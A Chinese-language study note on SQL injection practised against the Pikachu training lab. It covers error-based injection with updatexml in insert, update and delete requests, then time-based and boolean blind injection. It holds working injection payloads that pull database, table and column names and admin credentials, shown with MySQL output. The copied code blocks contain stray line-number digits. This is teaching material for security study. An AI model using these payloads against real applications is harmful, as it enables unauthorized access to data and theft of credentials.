---
title: "网安笔记 - web漏洞 - sql注入 - 报错盲注"
category: "网安笔记"
date: 2025-11-09
published: 2025-11-09
author: "Rin"
---

当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。

### 一、设计知识点

#补充:上课的Access暴力猜解不出的问题?

```
Access扁移注入:解决列名获取不到的情况
查看登陆框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况
```

参考笔记：[https://www.fujieace.com/penetration-test/access-offset-injection.html](https://www.fujieace.com/penetration-test/access-offset-injection.html)

#### 1、SQL语句网站应用

```
select查询数据
在网站应用中进行数据显示查询操作
例: select * from news where id=$id

insert插入数据
在网站应用中进行用户注册添加等操作
例: insert into news (id, url,text) values ( 2，'x','$t')

delete删除数据
后台管理里面删除文章删除用户等操作
例: delete from news where id=$id

update更新数据
会员或后台中心数据同步或缓存等操作
例: update user set pwd='$p' where id=2 and username=' admin'

order by排序数据
一般结合表名或列名进行数据排序操作
例: select * from news order by $id
例: select id , name , price from news order by $order
```

### 二、SQL语句盲注

盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:

```
1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid
2、基于时间的sQL盲注-延时判断 if ,sleep
3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue 
```

参考地址：[https://www.jianshu.com/p/bc35f8dd4f7c](https://www.jianshu.com/p/bc35f8dd4f7c) [https://developer.aliyun.com/article/692723](https://developer.aliyun.com/article/692723)

首先了解下updatexml()函数1

UPDATEXML (XML_document, XPath_string, new_value);

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc

第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。

第三个参数：new_value，String格式，替换查找到的符合条件的数据

作用：改变文档中符合条件的节点的值

改变XML_document中符合XPATH_string的值

而我们的注入语句为：

```
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出

```
ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'
```

**使用pikachu靶场进行测试，使用docker搭建pikachu靶场**

`docker run -d -p 8000:80 area39/pikachu:latest`

#### 1、insert语句

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624509400467-3e52cf6f-b678-4ad3-a76d-16cc7e651345.png)

用burp抓取数据包、并修改数据包

```
'or updatexml(1,concat(0x7e,database(),0x7e),0) or'
```

```
username=xiaodi'or updatexml(1,concat(0x7e,version(),0x7e),0) or'&password=123456&sex=man&phonenum=138&email=%E5%9B%9B%E5%B7%9D&add=%E6%88%90%E9%83%BD&submit=submit
```

注意：将注意语句放在语句的其他位置是可以的注意看网站提交的数据。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624509812656-c2a0812c-c995-42e1-8a5a-f9b5bd747b80.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624509849134-7c66628a-8c23-4800-9b75-f30ebb020094.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624510223004-65c1f43e-29d7-4252-98ac-9fcdd4f8d578.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624510326551-46fbe513-b948-4bd2-94db-b39c6591b935.png)

#### 2、update语句

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624520379378-f596e154-f224-40ea-97da-ec59dd738ea0.png)

发送到repeter模块当中,修改数据包

```
'or updatexml(1,concat(0x7e,database(),0x7e),0) or'
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624520450158-186e35b8-3831-469f-899e-15612eb784ee.png)

原理基本一致

#### 3、delete语句

```
payload: 68 or updatexml (1,concat(0x7e,datebase()),0)
且在BurpSuite中Ctrl+U 对payload进行url编码
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624520890335-775291ae-952d-4567-af78-b1941a8265c8.png)

### 三、SQL时间盲注

#### 1、sleep语句

```
mysql> select * from member where id=1;
+----+----------+----------------------------------+-------+----------+---------+--------+
| id | username | pw                               | sex   | phonenum | address | email  |
+----+----------+----------------------------------+-------+----------+---------+--------+
|  1 | vince    | e10adc3949ba59abbe56e057f20f883e | admin | asdasd   | 四川    | 成都   |
+----+----------+----------------------------------+-------+----------+---------+--------+
1 row in set (0.00 sec)
mysql>
mysql> select * from member where id=1 and sleep(5);
Empty set (5.00 sec)

mysql>
```

#### 2、if语句

```
mysql> select if(database()='pikachu',123,456);
+----------------------------------+
| if(database()='pikachu',123,456) |
+----------------------------------+
|                              123 |
+----------------------------------+
1 row in set (0.00 sec)

mysql> select if(database()='test',123,456);
+-------------------------------+
| if(database()='test',123,456) |
+-------------------------------+
|                           456 |
+-------------------------------+
1 row in set (0.00 sec)

mysql>
```

#### 3、if+sleep语句

```
mysql> select * from member where id=1 and sleep(if(database()='pikachu',5,0));
Empty set (5.00 sec)

mysql>
```

语句的意思就是如果数据是pikachu就延迟5秒输出，不是的话就立即返回，但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱，

```
参考:
like 'ros'									#判断ro或ro...是否成立
regexp '^xiaodi [a-z]'			#匹配xiaodi及xiaodi...等if(条件,5,0)
sleep (5)										#sQL语句延时执行s秒
mid (a, b, c)								#从位置b开始，截取a字符串的c位
substr( a,b, c)							#从b位置开始，截取字符串a的c长度
left (database(),1), database() #left(a,b)从左侧截取a的前b位
length(database ())=8				#判断数据库database ()名的长度
ord=ascii ascii(x)=97 			#判断x的ascii码是否等于97
```

#### 4、if+mid+sleep

判断数据库名称是不是以p开头如果是的话就延迟五秒输出。

```
mysql> select database();
+------------+
| database() |
+------------+
| pikachu    |
+------------+
1 row in set (0.00 sec)
mysql> select * from users where id=1 and sleep(if(mid(database(),1,1)='p',5,0));
Empty set (5.00 sec)
```

### 四、布尔盲注

  

```
布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。
 页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。
12
```

  

布尔注入用到的函数：

  

```
mid(str,start,length)  :字符串截取
ORD()                  :转换成ascii码
Length()               :统计长度
version()              :查看数据库版本
database()             :查看当前数据库名
user()                 :查看当前用户
123456
```

  

布尔注入流程：  
**猜解获取数据库长度**

  

```
' or length(database()) > 8 --+    :符合条件返回正确，反之返回错误
1
```

  

**猜解数据库名**

  

```
'or mid(database(),1,1)= 'z' --+    :因为需要验证的字符太多，所以转化为ascii码验证
'or ORD(mid(database(),1,1)) > 100 --+ :通过确定ascii码，从而确定数据库名
12
```

  

**猜解表的总数**

  

```
'or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   :判断表的总数
1
```

  

**猜解第一个表名的长度**

  

```
'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+
'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）
12
```

  

**猜解第一个表名**

  

```
'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = 'a'  --+
或者
'Or ORD(mid(select TABLE_NAME from information_schema.TABLES where 
TABLE_SCHEMA = database() limit 0,1),1,1)) >100   --+
1234
```

  

**猜解表的字段的总数**

  

```
'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='表名') > 5 --+
1
```

  

**猜解第一个字段的长度**

  

```
'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 0,1) = 10 --+
'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 10 --+ （第二个字段）
12
```

  

**猜解第一个字段名**

  

```
'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1) = 'i' --+
或者
'or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1)) > 100 --+
123
```

  

**猜解直接猜测字段名**

  

```
' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 'username' --+
1
```

  

**猜解内容长度**

  

```
假如已经知道字段名为  id   username password
'or (select Length(concat(username,"---",password)) from admin limit 0,1) = 16  --+
12
```

  

**猜解内容**

  

```
'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = 'a' --+
或者
'or ORD(mid((select concat(username,"-----",password) from admin limit 0,1),1,1)) > 100 --+    ASCII码猜解
123
```

  

**也可以直接猜测内容**

  

```
'or (Select concat(username,"-----",password) from admin limit 0,1 ) = 'admin-----123456'   --+
1
```